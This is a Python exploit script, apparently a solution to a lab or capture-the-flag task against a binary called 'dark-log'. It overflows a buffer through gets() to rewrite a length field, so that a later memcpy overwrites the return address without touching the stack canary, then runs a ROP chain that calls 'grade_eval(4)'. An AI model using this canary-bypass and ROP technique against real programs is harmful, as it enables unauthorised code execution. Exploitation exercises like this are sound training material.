#!/usr/bin/env python3
"""Task 4: canary bypass on dark-log.

gets() fills expression[128] and lets us overwrite the `len` field at
offset 256 without touching the canary at offset 280.  Setting len to
0xa0 makes the later memcpy(logMsg + len, expression, 128) write over
the saved rbp and return address (starting exactly at rbp) while still
leaving the canary at rbp-8 intact.  The copied 128 bytes therefore form
a small ROP chain: pop rdi; ret / 4 / grade_eval.
"""
import struct
import sys

p64 = lambda x: struct.pack("<Q", x)

POP_RDI = 0x4018A3
GRADE   = 0x401677

chain  = p64(0)          # copied to saved rbp (unused)
chain += p64(POP_RDI)    # copied to return address
chain += p64(4)          # popped into rdi
chain += p64(GRADE)      # grade_eval(4)

payload  = chain
payload += b"A" * (256 - len(payload))  # pad to struct field `len`
payload += struct.pack("<I", 0xA0)      # len = 0xa0 -> memcpy lands on rbp
# Stop before the canary at offset 280: gets only adds its NUL at 260.

sys.stdout.buffer.write(payload)
